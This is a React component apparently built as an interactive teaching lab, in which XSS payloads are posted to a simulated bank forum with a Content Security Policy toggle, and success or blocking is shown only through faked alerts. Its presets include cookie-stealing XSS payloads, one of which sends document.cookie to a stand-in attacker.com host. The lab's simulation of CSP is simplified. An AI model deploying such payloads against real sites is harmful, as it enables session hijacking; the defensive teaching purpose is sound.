import React, { useState } from 'react';
import { Shield, Play, ShieldAlert, ShieldCheck, AlertTriangle, Terminal, Globe, Cookie } from 'lucide-react';

export default function XssCspLab() {
  const [payload, setPayload] = useState<string>('<img src=x onerror="alert(\'PWNED\'); stealSessionCookie(document.cookie);">');
  const [cspEnabled, setCspEnabled] = useState<boolean>(false);
  const [comments, setComments] = useState<Array<{ id: number; author: string; text: string }>>([
    { id: 1, author: 'alice_sec', text: 'Has the new multi-factor authentication been deployed to production?' },
    { id: 2, author: 'bob_dev', text: 'Yes, rolling out to staging cluster right now.' },
  ]);
  const [simulatedAlert, setSimulatedAlert] = useState<{
    show: boolean;
    title: string;
    message: string;
    cookieStolen?: string;
  } | null>(null);
  const [cspViolationReport, setCspViolationReport] = useState<string | null>(null);

  const presets = [
    { label: 'Image OnError (Cookie Steal)', code: '<img src=x onerror="stealCookie(document.cookie);">' },
    { label: 'Classic Script Tag', code: '<script>alert(document.domain);</script>' },
    { label: 'SVG Event Handler (Bypass)', code: '<svg onload=fetch("https://attacker.com/steal?c="+document.cookie)>' },
  ];

  const handlePostComment = () => {
    setCspViolationReport(null);
    setSimulatedAlert(null);

    // If CSP is enabled:
    if (cspEnabled) {
      setCspViolationReport(
        `[CSP BLOCKED] Refused to execute inline event handler / script because it violates the following Content Security Policy directive: "script-src 'self' 'nonce-8xK19m'". Evaluation terminated.`
      );
      // Still append as sanitized text
      setComments(prev => [...prev, { id: Date.now(), author: 'attacker_guest', text: payload }]);
      return;
    }

    // Vulnerable execution:
    setComments(prev => [...prev, { id: Date.now(), author: 'attacker_guest', text: payload }]);

    if (payload.includes('onerror') || payload.includes('<script>') || payload.includes('onload')) {
      setTimeout(() => {
        setSimulatedAlert({
          show: true,
          title: 'SIMULATED BROWSER XSS EXECUTION',
          message: `Injected script ran with document scope on origin: https://target-bank.local`,
          cookieStolen: 'session_token=d8f7e6a10c9b4e2f_admin_uid_101; HttpOnly=false',
        });
      }, 300);
    }
  };

  return (
    <div className="rounded-2xl border border-white/10 bg-black/60 p-6 md:p-8 backdrop-blur-xl shadow-2xl">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-6 border-b border-white/10">
        <div className="flex items-center gap-3">
          <div className="p-2.5 rounded-xl bg-blue-500/10 border border-blue-500/30 text-blue-400">
            <Globe className="w-6 h-6" />
          </div>
          <div>
            <h3 className="text-lg font-bold text-white flex items-center gap-2">
              OWASP XSS & CSP Defense Sandbox
              <span className="text-xs font-mono px-2 py-0.5 rounded-full bg-blue-500/20 text-blue-300 border border-blue-500/30">
                LIVE INTERACTIVE LAB
              </span>
            </h3>
            <p className="text-xs font-mono text-gray-400">Simulated Target: Public Customer Discussion Forum</p>
          </div>
        </div>

        {/* CSP Defense Toggle */}
        <div className="flex items-center gap-3 bg-white/5 px-4 py-2 rounded-xl border border-white/10">
          <span className="text-xs font-mono text-gray-300">CSP Policy:</span>
          <button
            onClick={() => {
              setCspEnabled(!cspEnabled);
              setSimulatedAlert(null);
              setCspViolationReport(null);
            }}
            className={`px-3 py-1 text-xs font-mono font-bold rounded-lg transition-all flex items-center gap-1.5 cursor-pointer ${
              cspEnabled
                ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 shadow-[0_0_15px_rgba(16,185,129,0.3)]'
                : 'bg-red-500/20 text-red-400 border border-red-500/40'
            }`}
          >
            {cspEnabled ? (
              <>
                <ShieldCheck className="w-3.5 h-3.5" />
                Strict CSP (Active)
              </>
            ) : (
              <>
                <ShieldAlert className="w-3.5 h-3.5" />
                No CSP (Vulnerable)
              </>
            )}
          </button>
        </div>
      </div>

      {/* Preset Payloads */}
      <div className="my-6">
        <label className="text-xs font-mono text-gray-400 block mb-2">QUICK XSS PAYLOADS:</label>
        <div className="flex flex-wrap gap-2">
          {presets.map((preset, idx) => (
            <button
              key={idx}
              onClick={() => setPayload(preset.code)}
              className="text-xs font-mono px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 text-gray-300 hover:text-white transition-all cursor-pointer"
            >
              {preset.label}
            </button>
          ))}
        </div>
      </div>

      {/* Input */}
      <div className="mb-6">
        <label className="text-xs font-mono text-gray-400 block mb-1.5">COMMENT TEXT / INJECTION PAYLOAD:</label>
        <div className="flex gap-2">
          <input
            type="text"
            value={payload}
            onChange={(e) => setPayload(e.target.value)}
            className="flex-1 bg-black/80 border border-white/20 rounded-xl px-4 py-2.5 font-mono text-xs md:text-sm text-blue-300 focus:outline-none focus:border-blue-500 transition-colors"
          />
          <button
            onClick={handlePostComment}
            className="px-6 py-2.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-mono font-bold text-xs md:text-sm flex items-center gap-2 shadow-[0_0_20px_rgba(59,130,246,0.5)] transition-all cursor-pointer whitespace-nowrap"
          >
            <Play className="w-4 h-4" />
            Submit Post
          </button>
        </div>
      </div>

      {/* Simulated Browser Viewport */}
      <div className="rounded-xl border border-white/20 bg-slate-950 overflow-hidden mb-6">
        {/* Browser Top Bar */}
        <div className="bg-slate-900 px-4 py-2 border-b border-white/10 flex items-center gap-3">
          <div className="flex gap-1.5">
            <div className="w-2.5 h-2.5 rounded-full bg-red-500" />
            <div className="w-2.5 h-2.5 rounded-full bg-yellow-500" />
            <div className="w-2.5 h-2.5 rounded-full bg-green-500" />
          </div>
          <div className="flex-1 bg-black/60 rounded-md px-3 py-1 text-xs font-mono text-gray-400 border border-white/10 truncate">
            https://target-bank.local/forum/threads/204
          </div>
          <div className="text-[10px] font-mono px-2 py-0.5 rounded bg-white/10 text-gray-300">
            {cspEnabled ? 'CSP: ON' : 'CSP: NONE'}
          </div>
        </div>

        {/* Browser Content */}
        <div className="p-4 space-y-3">
          <div className="text-xs font-bold text-gray-300 uppercase tracking-wider mb-2">Community Forum Discussion:</div>
          {comments.map((c) => (
            <div key={c.id} className="p-3 rounded-lg bg-white/5 border border-white/5 text-xs font-mono">
              <div className="flex items-center justify-between text-gray-400 mb-1">
                <span className="font-bold text-blue-400">@{c.author}</span>
                <span className="text-[10px] text-gray-500">just now</span>
              </div>
              <div className="text-gray-200 break-all">{c.text}</div>
            </div>
          ))}
        </div>
      </div>

      {/* Simulated Popups or CSP Alerts */}
      {simulatedAlert && (
        <div className="mb-6 p-5 rounded-xl bg-red-500/10 border border-red-500/40 text-red-300 font-mono text-xs">
          <div className="flex items-center gap-2 text-sm font-bold text-red-400 mb-2">
            <AlertTriangle className="w-5 h-5" />
            {simulatedAlert.title}
          </div>
          <p className="mb-3">{simulatedAlert.message}</p>
          {simulatedAlert.cookieStolen && (
            <div className="p-3 rounded-lg bg-black/60 border border-red-500/30 flex items-center justify-between flex-wrap gap-2">
              <div className="flex items-center gap-2">
                <Cookie className="w-4 h-4 text-amber-400" />
                <span className="text-gray-300">EXFILTRATED VICTIM COOKIE:</span>
              </div>
              <span className="text-amber-300 font-bold">{simulatedAlert.cookieStolen}</span>
            </div>
          )}
          <div className="mt-3 flex items-center justify-between bg-emerald-500/10 p-2.5 rounded border border-emerald-500/30 text-emerald-400 font-bold">
            <span>CTF FLAG CAPTURED:</span>
            <span>FLAG&#123;XSS_DOM_COOKIE_EXFILTRATED_2026&#125;</span>
          </div>
        </div>
      )}

      {cspViolationReport && (
        <div className="mb-6 p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/40 text-emerald-300 font-mono text-xs">
          <div className="flex items-center gap-2 font-bold mb-1">
            <ShieldCheck className="w-4 h-4 text-emerald-400" />
            CONTENT SECURITY POLICY INTERCEPTED ATTACK:
          </div>
          <p className="text-gray-300 leading-relaxed">{cspViolationReport}</p>
        </div>
      )}
    </div>
  );
}
